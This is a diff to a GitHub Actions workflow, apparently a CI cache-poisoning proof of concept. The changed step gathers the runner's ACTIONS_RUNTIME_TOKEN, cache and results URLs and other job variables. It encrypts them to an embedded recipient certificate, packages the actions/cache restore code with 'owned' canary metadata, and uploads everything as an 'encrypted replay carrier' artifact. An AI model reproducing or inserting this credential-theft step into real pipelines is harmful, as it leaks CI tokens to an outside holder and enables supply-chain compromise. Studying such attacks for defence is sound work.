@@ -41,21 +41,22 @@ jobs:
           test "$(cat .cache-c6/canary.txt)" = "owned-c6-${GITHUB_RUN_ID}"
           printf 'b1=exact-canary\n'
       - name: Seal replay tuple and cache client
+        uses: actions/github-script@v8
         env:
           C6_RECIPIENT_CERT_B64: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVIVENDQW9XZ0F3SUJBZ0lVTFd1OGNyVy9jTU5Ja3kyRktESWxmL0lWNXYwd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0hqRWNNQm9HQTFVRUF3d1RZell0WlhCb1pXMWxjbUZzTFhKbGNHeGhlVEFlRncweU5qQTVNVFV4TkRBMQpNVGhhRncweU5qQTVNVFl4TkRBMU1UaGFNQjR4SERBYUJnTlZCQU1NRTJNMkxXVndhR1Z0WlhKaGJDMXlaWEJzCllYa3dnZ0dpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElCandBd2dnR0tBb0lCZ1FDbXl5SjFSdEN3bGtJaWsxY3MKRkVRSis3dTNEYnRNRHBDQ1QzU2xidFYvcnU3Zks5Mjd3U2V1Nkp0TnFpU1pCZWNpelpoajNZanJFMEQ4VjRTeQo5T3ZrcWhCSGJRZjdpRVM0U29HNllQUURKdm1VQm5CNk95MERjUFFrMXdqSzlSc1ZSNHdRTWVEQ2kva2dZK0pjClFQUCtXMTVOQXpoMGEvZlMyMzhPN2dBdHVtSHdiS3o4N2lhY2picHJsV2M0dC9kblZYOXM2alJ2Z1JwU2ZtNjIKUE52VGlta0p2Sjh0dlFqUEdCZWpWL1NxQVBsd1FYM0cvYkVvY0lSb0JKN3NNdlpLTjhldjRrR1RqODllV3drdgpudFFKc1Q4cll0blplTmR5QUx5THJydUp2ZVR1aUJueENQOStoa2ExZzZndGpxMnZSVitlb1NqclJOTGdpcUJlCnpITy9oRkl2Vks2T21pYUdrNEQwc3NiTGtRdUVQL2Z2Z2tZeGpsLzRQTVh6VSt0UXhXcmphbU5oY3JkWmJjKzgKQ1VMcVlZMDB2UENYZ011WWtrVmpTVitBR1h0enJKaFNIak8rUEpFbE5oY3RzTGR1QVN1RHk2OFh6NVlOU3hPVQo2QnZTUTdmTFpUS3NhZGlOTVU1T05ORzdBYjlIcGhkZWNOaUZRWVV5bnQ5TUgvY0NBd0VBQWFOVE1GRXdIUVlEClZSME9CQllFRkNnNlBUcVM1c2xSUjVmMzVtaWRiZ0RSckV2Y01COEdBMVVkSXdRWU1CYUFGQ2c2UFRxUzVzbFIKUjVmMzVtaWRiZ0RSckV2Y01BOEdBMVVkRXdFQi93UUZNQU1CQWY4d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dHQgpBR1Y5RmVXcU1FSXZYbHVhbmVLSEt4N2xxWXJFWEZMeVh1UEcyU1RsVW1od3cwSW50MmkxSXhuNFVCcFZFNGxxCjBqVHBSNUM3Z3ZrNUJySXhNbnY2cGVlcHNWcVV1WVpPS1F4WVlCOGVPVXNjODE4TjJSMnUwd0plRUhGOFBDOFkKYnRQakM4YncvMjcwY3pabVpQOUpOb0RwbjJVMFJURWEvcU9qUjVmY3hDc2ZnQ1hRUzBqZm42Z25sN2Z3Wks1WQpNUEV4bVVyYWJvWkV5anlIaSt6WVRFbzhiNko1dDg4RFVXbE5HV0p3clAvTmpzUGVrKzFVOUxpWHVCdnZWTGErCmFsUUxRQzdiU0tKNEhpOHZuWFNiTk9GTDBhYVdUbEFLalBzMGllVm0zRXA1K0lvc3Y3djVmSTI2eklSV2xtNDUKUkV0UEF0NGt0c2xUcGtmZXIwTDFDVEVzMzBGblRGM2dXVlcvU0QrQnpSYWFBL0NTUDRuTGszS2w2MEVVQmhwZApsdE9hVzJSTUZ1c21OVTE2V0JJRTZodE5EakNvSC8yT29WNlJWZUFOeVBROHkxLzN1alFCbHk2R2tqUkltRHU5CkFucUNWK0o1ZHFPR0YrUGhDN0JNb0pBRkdTVXNUNU4yYXMwZ0NWZUFYdjc1K3Rxb0E5QzdoMWZvSFFWRFlDQnMKNmc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
-        run: |
-          set -eu
-          test -n "$ACTIONS_RUNTIME_TOKEN"
-          test -n "$ACTIONS_RESULTS_URL"
-          bundle="$GITHUB_WORKSPACE/c6-replay"
-          plaintext="$RUNNER_TEMP/c6-payload.json"
-          cert="$RUNNER_TEMP/c6-recipient-cert.pem"
-          mkdir -p "$bundle"
-          printf '%s' "$C6_RECIPIENT_CERT_B64" | base64 -d > "$cert"
-          python3 - <<'PY'
-          import json
-          import os
-          fields = (
+        with:
+          script: |
+            const fs = require("fs");
+            const path = require("path");
+            const childProcess = require("child_process");
+            for (const field of ["ACTIONS_RUNTIME_TOKEN", "ACTIONS_RESULTS_URL"]) {
+              if (!process.env[field]) throw new Error(`missing ${field}`);
+            }
+            const bundle = path.join(process.env.GITHUB_WORKSPACE, "c6-replay");
+            const plaintext = path.join(process.env.RUNNER_TEMP, "c6-payload.json");
+            const cert = path.join(process.env.RUNNER_TEMP, "c6-recipient-cert.pem");
+            fs.mkdirSync(bundle, {recursive: true});
+            const fields = [
               "ACTIONS_RUNTIME_TOKEN",
               "ACTIONS_CACHE_URL",
               "ACTIONS_RESULTS_URL",
@@ -66,19 +67,40 @@ jobs:
               "GITHUB_SHA",
               "RUNNER_OS",
               "RUNNER_ARCH",
-          )
-          with open(os.path.join(os.environ["RUNNER_TEMP"], "c6-payload.json"), "w", encoding="utf-8") as handle:
-              json.dump({field: os.environ.get(field, "") for field in fields}, handle)
-          PY
-          openssl cms -encrypt -binary -aes-256-cbc -in "$plaintext" \
-            -out "$bundle/c6-payload.p7m" -outform DER -recip "$cert"
-          rm -f "$plaintext" "$cert"
-          action_root="$(cd "$(dirname "$GITHUB_WORKSPACE")/../_actions/actions/cache/v4" && pwd)"
-          test -f "$action_root/dist/restore/index.js"
-          tar -C "$action_root" -czf "$bundle/actions-cache-v4.tgz" \
-            action.yml dist/restore/index.js
-          printf '{"key":"c6-owned-%s","canary":"owned-c6-%s"}\n' \
-            "$GITHUB_RUN_ID" "$GITHUB_RUN_ID" > "$bundle/metadata.json"
+            ];
+            fs.writeFileSync(
+              plaintext,
+              JSON.stringify(Object.fromEntries(fields.map(field => [field, process.env[field] || ""]))),
+              {mode: 0o600},
+            );
+            fs.writeFileSync(cert, Buffer.from(process.env.C6_RECIPIENT_CERT_B64, "base64"), {mode: 0o600});
+            childProcess.execFileSync("openssl", [
+              "cms", "-encrypt", "-binary", "-aes-256-cbc",
+              "-in", plaintext,
+              "-out", path.join(bundle, "c6-payload.p7m"),
+              "-outform", "DER",
+              "-recip", cert,
+            ]);
+            fs.rmSync(plaintext);
+            fs.rmSync(cert);
+            const actionRoot = path.resolve(
+              process.env.GITHUB_WORKSPACE,
+              "..", "..", "_actions", "actions", "cache", "v4",
+            );
+            const restoreBundle = path.join(actionRoot, "dist", "restore", "index.js");
+            if (!fs.existsSync(restoreBundle)) throw new Error("restore bundle missing");
+            childProcess.execFileSync("tar", [
+              "-C", actionRoot,
+              "-czf", path.join(bundle, "actions-cache-v4.tgz"),
+              "action.yml", "dist/restore/index.js",
+            ]);
+            fs.writeFileSync(
+              path.join(bundle, "metadata.json"),
+              JSON.stringify({
+                key: `c6-owned-${process.env.GITHUB_RUN_ID}`,
+                canary: `owned-c6-${process.env.GITHUB_RUN_ID}`,
+              }),
+            );
       - name: Upload encrypted replay carrier
         uses: actions/upload-artifact@v4
         with:
